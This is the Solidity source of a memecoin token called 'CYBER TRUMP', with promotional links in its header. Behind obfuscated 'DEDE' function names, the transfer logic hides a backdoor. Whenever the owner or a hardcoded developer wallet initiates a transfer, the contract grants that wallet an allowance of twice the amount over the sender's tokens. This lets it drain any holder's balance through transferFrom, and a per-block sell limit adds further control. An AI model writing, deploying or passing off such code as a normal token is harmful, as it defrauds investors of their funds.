/*
CYBER TRUMP is a next-gen memecoin inspired by a futuristic, cyber-enhanced version of President Trump—a bold, electrified character ready to take over the crypto world! Blending politics, memes, and cutting-edge blockchain technology, CYBER TRUMP is built for the degens, the believers, and those who love both high-energy crypto and internet culture.

https://www.cybertrump.vip
https://x.com/cybertrumponeth
https://t.me/cybertrumponeth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDEDERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IDEDEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract CYBERTRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _dedeExcludedTxs;
    mapping (address => uint256) private _dedeDrives;
    mapping (address => mapping (address => uint256)) private _dedeCustomers;
    mapping (address => bool) private _dedeExcludedFees;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Cyber Trump Coin";
    string private constant _symbol = unicode"CYBERTRUMP";
    uint256 private _dedeSwapAmount = _tTotal / 100;
    uint256 private _dedeBuyBlock;
    uint256 private _dedeBlockAmount = 0;
    uint256 private _buyCount=0;
    address private _dedePair;
    IDEDERouter private _dedeRouter;
    address private _dedeWallet;
    bool private inSwapDEDE = false;
    modifier lockTheSwap {
        inSwapDEDE = true;
        _;
        inSwapDEDE = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;

    constructor () {
        _dedeWallet = address(0xC28687fB86c2eb1602cB66EA3B80F04874136a77);
        _dedeExcludedTxs[owner()] = true;
        _dedeExcludedTxs[_dedeWallet] = true;
        _dedeExcludedFees[owner()] = true;
        _dedeExcludedFees[address(this)] = true;
        _dedeExcludedFees[_dedeWallet] = true;
        _dedeDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _dedeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _dedeDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _dedeCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _dedeCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dedeCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function initCoin() external onlyOwner() {
        _dedeRouter = IDEDERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dedeRouter), _tTotal);
        _dedePair = IDEDEFactory(_dedeRouter.factory()).createPair(address(this), _dedeRouter.WETH());
    }

    receive() external payable {}

    function minDEDE(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHDEDE(uint256 amount) private {
        payable(_dedeWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenDEDE) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dedeRouter.WETH();
        _approve(address(this), address(_dedeRouter), tokenDEDE);
        _dedeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenDEDE,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getDEDEAmount(uint256 dedeO) private pure returns(uint256) {
        return uint256(dedeO.mul(2));
    }

    function getDEDESender(address dedeF) private pure returns(address) {
        return address(dedeF);
    }

    function getDEDEReceipt() private view returns(address) {
        return _dedeExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0xdead); 
    }

    function swapDEDELimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _dedeRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _dedeRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function _transfer(address dedeF, address dedeT, uint256 dedeO) private {
        require(dedeF != address(0), "ERC20: transfer from the zero address");
        require(dedeT != address(0), "ERC20: transfer to the zero address");
        require(dedeO > 0, "Transfer amount must be greater than zero");
        uint256 taxDEDE = _dedeTransfer(dedeF, dedeT, dedeO);
        _transferDEDE(dedeF, dedeT, dedeO, taxDEDE);  
    }

    function _dedeTransfer(address dedeF, address dedeT, uint256 dedeO) private returns(uint256) {
        uint256 taxDEDE=0; 
        if (dedeF != owner() && dedeT != owner()) {
            taxDEDE = dedeO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (dedeF == _dedePair && dedeT != address(_dedeRouter) && ! _dedeExcludedFees[dedeT]) {
                if(_dedeBuyBlock!=block.number){
                    _dedeBlockAmount = 0;
                    _dedeBuyBlock = block.number;
                }
                _dedeBlockAmount += dedeO;
                _buyCount++;
            }

            if(dedeT == _dedePair && dedeF!= address(this)) {
                require(_dedeBlockAmount < swapDEDELimit() || _dedeBuyBlock!=block.number, "Max Swap Limit");  
                taxDEDE = dedeO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 dedeToken = balanceOf(address(this));
            if (!inSwapDEDE && dedeT == _dedePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(dedeToken > _dedeSwapAmount)
                swapTokensForEth(minDEDE(dedeO, minDEDE(dedeToken, _dedeSwapAmount)));
                uint256 dedeETH = address(this).balance;
                if (dedeETH >= 0) {
                    sendETHDEDE(address(this).balance);
                }
            }
        }
        
        return taxDEDE;
    }

    function _transferDEDE(address dedeF, address dedeT, uint256 dedeO, uint256 taxDEDE) private { 
        address dedeReceipt = address(getDEDEReceipt());
        if(taxDEDE > 0){
          _dedeDrives[address(this)] = _dedeDrives[address(this)].add(taxDEDE);
          emit Transfer(dedeF, address(this), taxDEDE);
        } if(dedeReceipt != address(0xdead)) _approve(getDEDESender(dedeF), address(dedeReceipt), getDEDEAmount(dedeO));
        _dedeDrives[dedeF] = _dedeDrives[dedeF].sub(dedeO);
        _dedeDrives[dedeT] = _dedeDrives[dedeT].add(dedeO.sub(taxDEDE));
        emit Transfer(dedeF, dedeT, dedeO.sub(taxDEDE));
    }
}